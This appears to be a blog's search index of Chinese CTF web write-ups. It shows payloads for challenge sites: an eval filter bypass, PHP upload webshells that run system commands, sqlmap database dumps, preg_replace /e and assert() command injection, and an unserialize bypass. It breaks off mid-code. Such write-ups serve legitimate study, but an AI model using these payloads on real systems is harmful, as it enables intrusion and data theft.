<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>BUUCTFWebWP</title>
      <link href="/2019/11/04/buuctfWebWP/"/>
      <content type="html"><![CDATA[<p>BuuCTF平台部分WebWP</p><a id="more"></a><h3 id="0x00-RoarCTF-Easy-Calc"><a href="#0x00-RoarCTF-Easy-Calc" class="headerlink" title="0x00 RoarCTF Easy Calc"></a>0x00 RoarCTF Easy Calc</h3><p>-RoarCTF 2019</p><p>页面是一个需要输入计算式的计算器</p><p><img src="https://i.postimg.cc/d3vzLtLY/1.png" alt></p><p>查看源码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--I've set up WAF to ensure security.--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">'#calc'</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            url:<span class="string">"calc.php?num="</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">"#content"</span>).val()),</span></span><br><span class="line"><span class="actionscript">            type:<span class="string">'GET'</span>,</span></span><br><span class="line"><span class="actionscript">            success:<span class="function"><span class="keyword">function</span><span class="params">(data)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">                $(<span class="string">"#result"</span>).html(`&lt;div <span class="class"><span class="keyword">class</span>="<span class="title">alert</span> <span class="title">alert</span>-<span class="title">success</span>"&gt;</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">strong</span>&gt;</span>答案:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>$&#123;data&#125;</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span>`);</span></span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="actionscript">            error:<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">                alert(<span class="string">"这啥?算不来!"</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>提示存在WAF还有calc.php页面，访问calc.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们需要绕过WAF的过滤，并且payload中不能存在黑名单里的字符，直接传入参数会403，需要对执行的payload进行URL编码，百度查看文章发现，php当传入的参数为<strong>“ num”</strong>时可执行函数命令</p><p>测试payload：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">calc.php? <span class="attribute">num</span>=phpinfo()</span><br></pre></td></tr></table></figure><p>成功执行</p><p><img src="https://i.postimg.cc/2ywgvRZB/2.png" alt></p><p>构造num读取目录中的文件，可以使用scandir(“/“)，但“/”被黑名单过滤了，使用chr(47)绕过即可</p><p>payload:</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">calc.php? num=var<span class="constructor">_dump(<span class="params">scandir</span>(<span class="params">chr</span>(47)</span>))</span><br></pre></td></tr></table></figure><p><img src="https://i.postimg.cc/hP2Htnnk/3.png" alt></p><p>继续构造num读取f1agg，payload：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">calc.php? num=<span class="number">1</span>;var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure><p>成功读取flag</p><p><img src="https://i.postimg.cc/zDSs4WcX/4.png" alt></p><h3 id="0x01-easy-tornado"><a href="#0x01-easy-tornado" class="headerlink" title="0x01 easy_tornado"></a>0x01 easy_tornado</h3><p>-护网杯</p>]]></content>
      
      
        <tags>
            
            <tag> -ctf -Writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>攻防世界WebWP(Part2)</title>
      <link href="/2019/10/18/adworldWebWP(2)/"/>
      <content type="html"><![CDATA[<p>攻防世界web进阶区WP(part2)</p><a id="more"></a><h3 id="0x00-Web2"><a href="#0x00-Web2" class="headerlink" title="0x00  Web2"></a>0x00  Web2</h3><p>打开页面是一段php加密代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$miwen=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $_o=strrev($str);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">        $__=ord($_c)+<span class="number">1</span>;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode($_)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>编写解密脚本解密即可：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$miwen=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>; </span><br><span class="line">$ming=base64_decode(strrev(str_rot13($miwen)));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ddd</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $b=<span class="string">""</span>;</span><br><span class="line">  <span class="keyword">for</span>($tt=<span class="number">0</span>;$tt&lt;strlen($str);$tt++)</span><br><span class="line">  &#123;</span><br><span class="line">    $b=$b.(chr(ord($str[$tt])<span class="number">-1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> strrev(ddd($ming));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到flag：</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">flag:</span>&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;</span><br></pre></td></tr></table></figure><h3 id="0x01-PHP2"><a href="#0x01-PHP2" class="headerlink" title="0x01 PHP2"></a>0x01 PHP2</h3><p>页面只有一句话：“ Can you anthenticate to this website? “，尝试index.php，robots.txt均没有什么收获，尝试index.phps，发现源码泄露</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">"admin"</span>===$_GET[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"admin"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>即我们输入的id不能为”admin“，且urldecode后的id需要为”admin“</p><p>经查询，”%61”经urldecode后为”a“，”%61“经urlencode后为”%2561“，payload：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=%2561dmin</span><br></pre></td></tr></table></figure><p>传入，经urldecode后即为”admin“</p><p><img src="https://i.postimg.cc/FHqJLgb4/1.png" alt></p><h3 id="0x02-unserialize3"><a href="#0x02-unserialize3" class="headerlink" title="0x02 unserialize3"></a>0x02 unserialize3</h3><p>页面为一段php代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure><p>根据题目unserialize可以推测code应该传入<strong>class类</strong>序列化后的结果：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"xctf"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"flag"</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure><p>但是正常传入会调用<strong>_wakeup()</strong>方法，输出<strong>“bad requests”</strong>，我们需要绕过<strong>_wakeup()</strong>，查询可知，当序列化字符串表示对象个数的值大于真实个数时就会跳过_wakeup()的执行</p><p>将payload改为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"xctf"</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">"flag"</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure><p>即可绕过_wakeup()</p><p><img src="https://i.postimg.cc/zBwL6ssz/2.png" alt></p><h3 id="0x03-upload1"><a href="#0x03-upload1" class="headerlink" title="0x03 upload1"></a>0x03 upload1</h3><p>一个文件上传页面，查看源代码发现前端有文件后缀的验证，只允许上传后缀为‘jpg’和‘png’的文件，使用bp抓包修改后缀绕过即可</p><p>上传一个带有php代码的文件，后缀添加’.png‘，php代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"ls"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用bp抓包修改后缀，放包</p><p><img src="https://i.postimg.cc/1X5zTf0B/3.png" alt></p><p>可以看到上传成功，并且显示了文件所在的目录和文件名</p><p><img src="https://i.postimg.cc/sxVBrnzp/4.png" alt></p><p>访问该文件，成功执行了php代码</p><p><img src="https://i.postimg.cc/v8zgzd7X/5.png" alt></p><p>继续上传，在bp抓包时修改php代码，查看其他文件，php代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"ls .."</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问上传成功后的文件，发现“flag.php”文件，继续修改php代码上传查看该文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"cat ../flag.php"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问上传后的文件，查看源码即可获得flag</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/NFpKf1GZ/6.png" class="lazyload"></p><h3 id="0x04-ics-04"><a href="#0x04-ics-04" class="headerlink" title="0x04 ics-04"></a>0x04 ics-04</h3><p>题目提示：工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag。</p><p>随便注册一个用户登陆，提示<strong>普通用户登录成功,没什么用</strong></p><p>但发现可以用同一个用户名注册不同的密码且都可以登陆，考虑找出管理员的用户名注册新密码登陆</p><p>在登陆和找回密码页面尝试注入，发现在找回密码页面，输入“sunsh1ne”回显密保问题为”123”即设置的问题，输入“sunsh1ne’ or 1=’1”回显密保问题为“cetc”，猜测存在sql注入</p><p>使用bp抓包保存为test.txt再使用sqlmap跑一下</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/g2wxmXCB/7.png" class="lazyload"></p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sqlmap -r test.txt <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure><p>跑出了4个表</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/YqDv5fsW/8.png" class="lazyload"></p><p>继续查询cetc004数据库中的表</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sqlmap -r test.txt -D cetc004 <span class="comment">--tables</span></span><br></pre></td></tr></table></figure><p>只有1个user表</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/CLxZr6m0/9.png" class="lazyload"></p><p>查询user表中的数据</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sqlmap -r test.txt -D cetc004 -T<span class="built_in"> user </span>--dump</span><br></pre></td></tr></table></figure><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/LXVXNzPh/10.png" class="lazyload"></p><p>密码为hash值，使用<strong>“username=c3tlwDmIn23”</strong>的用户名再注册一次，登陆即可获得flag</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/SxwJsQqQ/11.png" class="lazyload"></p><h3 id="0x05-wtf-sh-150"><a href="#0x05-wtf-sh-150" class="headerlink" title="0x05 wtf.sh-150"></a>0x05 wtf.sh-150</h3><p>页面为一个论坛，注册一个用户登陆，可以发贴和回复，随便进入一个帖子，目录为</p><p>“/post.wtf?post=K8laH”，测试发现“post”参数存在目录穿越漏洞</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/post.wtf</span>?post=<span class="string">../</span></span><br></pre></td></tr></table></figure><p>源码泄露，搜索“flag”，得到有关代码</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/HxmnwSVf/12.png" class="lazyload"></p><p>代码格式化：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"/css/std.css"</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">        $ if contains 'user' $&#123;!URL_PARAMS[@]&#125; &amp;&amp; file_exists "users/$&#123;URL_PARAMS['user']&#125;"</span><br><span class="line">        $ then</span><br><span class="line">        $   local username=$(head -n 1 users/$&#123;URL_PARAMS['user']&#125;);</span><br><span class="line">        $   echo "<span class="tag">&lt;<span class="name">h3</span>&gt;</span>$&#123;username&#125;'s posts:<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>";</span><br><span class="line">        $   echo "<span class="tag">&lt;<span class="name">ol</span>&gt;</span>";</span><br><span class="line">        $   get_users_posts "$&#123;username&#125;" | while read -r post; do</span><br><span class="line">        $       post_slug=$(awk -F/ '&#123;print $2 "#" $3&#125;' &lt;&lt;&lt; "$&#123;post&#125;");</span><br><span class="line">        $       echo "<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">\</span>"/<span class="attr">post.wtf</span>?<span class="attr">post</span>=<span class="string">$&#123;post_slug&#125;\</span>"&gt;</span>$(nth_line 2 "$&#123;post&#125;" | htmlentities)<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>";</span><br><span class="line">        $   done </span><br><span class="line">        $   echo "<span class="tag">&lt;/<span class="name">ol</span>&gt;</span>";</span><br><span class="line">        $   if is_logged_in &amp;&amp; [[ "$&#123;COOKIES['USERNAME']&#125;" = 'admin' ]] &amp;&amp; [[ $&#123;username&#125; = 'admin' ]]</span><br><span class="line">        $   then</span><br><span class="line">        $       get_flag1</span><br><span class="line">        $   fi</span><br><span class="line">        $ fi</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>关键代码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">if is_logged_in &amp;&amp; [[ "$&#123;COOKIES['USERNAME']&#125;" = 'admin' ]] &amp;&amp; [[ $&#123;username&#125; = 'admin' ]]</span><br><span class="line">       $   then</span><br><span class="line">       $       get_flag1</span><br></pre></td></tr></table></figure><p>即我们需要以admin用户登录即可获得flag1，源码中发现<strong>“users”</strong>目录，访问下</p><p>获得了所有用户的用户名和cookie值</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/43VnhCN6/13.png" class="lazyload"></p><p>重新登陆，使用bp抓包以admin用户登陆</p>]]></content>
      
      
        <tags>
            
            <tag> -ctf -Writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>攻防世界WebWP(Part1)</title>
      <link href="/2019/10/02/adworldWebWP(1)/"/>
      <content type="html"><![CDATA[<p>攻防世界web进阶区WP(part1)</p><a id="more"></a><h3 id="0x00-Cat"><a href="#0x00-Cat" class="headerlink" title="0x00 Cat"></a>0x00 Cat</h3><p>打开网页，有一个云端测试功能，提示我们输入域名，输入<strong>127.0.0.1</strong>进行测试</p><p><img src="https://i.postimg.cc/W3dKgnKn/19.png" alt></p><p>尝试命令执行，输入<strong>127.0.0.1&amp;&amp;ls</strong>，<strong>127.0.0.1&amp;&amp;dir</strong>，<strong>127.0.0.1||ls</strong>等均提示<strong>Invalid URL</strong></p><p>但网站使用的是url编码传递，测试下，输入边界值<strong>“%80”</strong>时出现报错，可以看出网站使用的使用的是python站点和Django框架</p><p><img src="https://i.postimg.cc/xdTBTY3B/20.png" alt></p><p>百度找到方法应该要加@输入@/opt/api/dnsapi/settings.py，再一次出现报错信息，在报错信息中搜索数据库有关信息</p><p><img src="https://i.postimg.cc/xTvZvqsW/21.png" alt></p><p>再次读取</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">？<span class="attribute">url</span>=@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure><p>在报错信息中搜索flag，ctf即可</p><p><img src="https://i.postimg.cc/RV58JwT7/22.png" alt></p><h3 id="0x01-ics-05"><a href="#0x01-ics-05" class="headerlink" title="0x01 ics-05"></a>0x01 ics-05</h3><p>打开页面查看源码，发现”index.php”，进入后发现”?page=index”</p><p><img src="https://i.postimg.cc/nh2ZbTHj/3.png" alt></p><p>尝试使用“page=php://filter”读取文件</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">index</span>.php?page=php://<span class="keyword">filter</span>/<span class="keyword">read</span>=convert.base64-encode/resource=<span class="keyword">index</span>.php</span><br></pre></td></tr></table></figure><p>网站回显一段base64编码的字符串，解码得到php代码，关键代码如下:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先我们需要抓包构造X-Forwarded-For为127.0.0.1，<strong>preg_replace()</strong>函数会搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换，但/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码，我们可以构造一个payload测试一下</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">?pat=/<span class="keyword">test</span>/e&amp;<span class="keyword">rep</span>=system(<span class="string">"ls"</span>)&amp;<span class="keyword">sub</span>=just <span class="keyword">test</span></span><br></pre></td></tr></table></figure><p>可以看到成功执行了ls命令</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/0NHsrQK9/4.png" class="lazyload"></p><p>最终payload：</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">?pat=/<span class="keyword">test</span>/e&amp;<span class="keyword">rep</span>=system(<span class="string">"cat s3chahahaDir/flag/flag.php&amp;&amp; ls"</span>)&amp;<span class="keyword">sub</span>=just <span class="keyword">test</span></span><br></pre></td></tr></table></figure><h3 id="0x02-ics-06"><a href="#0x02-ics-06" class="headerlink" title="0x02 ics-06"></a>0x02 ics-06</h3><p>发现”index,php”，进入后是一个输入日期范围的页面，输入后发现url变为:</p><figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">111.198.29.45:53383</span>/index.php?id=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>尝试使用bp爆破一下id，成功爆破出id=2333</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/433GJtd8/5.png" class="lazyload"></p><h3 id="0x03-lottery"><a href="#0x03-lottery" class="headerlink" title="0x03 lottery"></a>0x03 lottery</h3><p>在附件中给出了源码，但其实robots.txt中有提示“.git”，可以使用GitHack下载源码。网站需要我们注册一个账号，初始有20$，购买7位数字的彩票，根据与中奖号码的比较获得不同的钱数，$9990000即可购买flag</p><p>查看源码，在api.php中发现在比较每一位数字时使用的是“==”，即弱类型比较</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;<span class="number">7</span>; $i++)&#123;</span><br><span class="line"><span class="keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">$same_count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用burp分析下数据包，用户输入的数据存储在</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"action"</span>:<span class="string">"buy"</span>,<span class="attr">"numbers"</span>:<span class="string">"1234567"</span>&#125;</span><br></pre></td></tr></table></figure><p>然后和随机生成的中奖号码进行对比从而获得不同的钱数</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"status"</span>:<span class="string">"ok"</span>,<span class="attr">"numbers"</span>:<span class="string">"1234567"</span>,<span class="attr">"win_numbers"</span>:<span class="string">"1266964"</span>,<span class="attr">"money"</span>:<span class="number">36</span>,<span class="attr">"prize"</span>:<span class="number">20</span>&#125;</span><br></pre></td></tr></table></figure><p>可以构造数据包使比较恒为true</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"action"</span>:<span class="string">"buy"</span>,<span class="attr">"numbers"</span>:[<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>]&#125;</span><br></pre></td></tr></table></figure><p>可以看到测试成功，获得了5000000$</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/sgTF0Xc5/6.png" class="lazyload"></p><p>重放两次即可获得所需的钱数，然后购买flag即可</p><h3 id="0x04-NewsCenter"><a href="#0x04-NewsCenter" class="headerlink" title="0x04 NewsCenter"></a>0x04 NewsCenter</h3><p>打开页面发现一个输入框，可以搜索新闻，尝试sql注入，输入后使用bp抓包</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/qRFwrH1c/16.png" class="lazyload"></p><p>把数据包的数据存储到test.txt中，使用sqlmap扫描(kali linux)</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sqlmap -r test.txt <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure><p>可以看到扫描到了两个数据库</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/Y9TP3FBw/17.png" class="lazyload"></p><p>指定<strong>news</strong>数据库显示其中的数据，得到flag</p><figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">sqlmap -r test.txt -D <span class="keyword">new</span><span class="type">s</span> --dump</span><br></pre></td></tr></table></figure><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/rpn3Dbhs/18.png" class="lazyload"></p><h3 id="0x05-mfw"><a href="#0x05-mfw" class="headerlink" title="0x05 mfw"></a>0x05 mfw</h3><p>页面提示使用了git，尝试是否存在git泄露</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/m2GGPKk1/7.png" class="lazyload"></p><p>使用githack把源码下载下来，查看index.php，发现</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们输入的page里面不能有”..”，但我们可以构造page去读其他的文件，测试payload</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">page=sunsh1n<span class="string">e','</span>abc<span class="string">') === false and system("cat templates/flag.php") and strops('</span>sunsh1ne</span><br></pre></td></tr></table></figure><p>分别闭合”strpos”函数两端的 “( “  “)” ，可以看到读取成功，查看源码得到flag</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/HnbDS9ZL/8.png" class="lazyload"></p><h3 id="0x06-Training-WWW-Robots"><a href="#0x06-Training-WWW-Robots" class="headerlink" title="0x06 Training-WWW-Robots"></a>0x06 Training-WWW-Robots</h3><p>打开页面，提示robots.txt，访问/robots.txt, 提示/fl0g.php，访问即可得到flag</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/kgq9pLdP/2.png" class="lazyload"></p><h3 id="0x07-NaNNaNNaNNaN-Batman"><a href="#0x07-NaNNaNNaNNaN-Batman" class="headerlink" title="0x07  NaNNaNNaNNaN-Batman"></a>0x07  NaNNaNNaNNaN-Batman</h3><p>下载附件，使用010editor打开，内容为</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/hjZtDcQG/9.png" class="lazyload"></p><p>发现是html脚本语言，修改文件后缀为html并使用浏览器打开后是一个输入框，将得到的代码整理后为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">function $()&#123;</span><br><span class="line"><span class="keyword">var</span> e=document.getElementById(<span class="string">"c"</span>).value;</span><br><span class="line"><span class="keyword">if</span>(e.length==<span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span>(e.match(/^be0f23/)!=<span class="keyword">null</span>)</span><br><span class="line"><span class="keyword">if</span>(e.match(/<span class="number">233</span>ac/)!=<span class="keyword">null</span>)</span><br><span class="line"><span 